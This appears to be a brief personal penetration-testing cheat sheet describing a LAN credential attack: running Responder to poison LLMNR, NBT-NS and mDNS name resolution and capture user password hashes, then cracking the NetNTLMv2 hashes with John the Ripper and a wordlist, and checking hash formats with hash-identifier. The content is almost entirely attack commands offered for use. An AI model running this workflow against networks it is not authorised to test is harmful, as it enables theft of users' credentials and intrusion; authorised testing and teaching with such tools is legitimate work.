**1. Responder (LAN only)**

Github: https://github.com/SpiderLabs/Responder
Attack and exploit insecure name resolution protocols in the LAN:
- LLMNR (Link-Local Multicast Name Resolution)
- NBT-NS (NetBIOS Name Service)
- mDNS (Multicast DNS)
```
python2 Responder.py -I eth0
```
=> Collect the hash user/password

**2. John**

Check and crack the hashed password
```
john <hash> --wordlist=/.../rock.. --format=netntlmv2
```
=> Crack the hashed password collected from Responder

**3. Check hash format**
```
hash-identifier <hash>
```
